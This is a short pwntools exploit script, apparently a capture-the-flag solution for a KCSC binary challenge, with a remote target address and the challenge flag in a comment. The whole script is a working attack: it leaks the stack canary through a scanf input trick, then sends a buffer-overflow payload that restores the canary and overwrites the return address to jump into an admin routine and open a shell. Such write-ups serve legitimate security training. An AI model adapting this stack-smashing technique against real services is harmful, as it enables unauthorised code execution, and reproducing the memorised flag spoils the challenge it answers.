#!/usr/bin/env python3
from pwn import *
exe = ELF("./main", checksec=False)
context.binary=exe
def conn():
    if args.REMOTE:
        r = remote("36.50.177.41", 50002)
        
    else:
        r = process([exe.path])
    return r
r = conn()
input()
admin_addr = 0x4014d3

# Leak canary 

def inp_id():
	r.sendlineafter(b'> ', b'1')
	r.sendlineafter(b'id 0: ', b'1')
	r.sendlineafter(b'id 1: ', b'1')
	r.sendlineafter(b'id 2: ', b'1')
	r.sendlineafter(b'id 3: ', b'+')

inp_id()

r.sendlineafter(b'> ', b'2')
r.recvuntil(b'communication id: [ 1 1 1 ')
canary = int(r.recv(20).decode())
info('Canary leak: ' + hex(canary))
# Get shell
payload = b'A'*1000 + p64(canary) + b'A'*8 + p64(admin_addr + 5)
r.sendlineafter(b'start -> ', payload)
# KCSC{c279cb580a741137b9a30096ca3b9706}
r.interactive()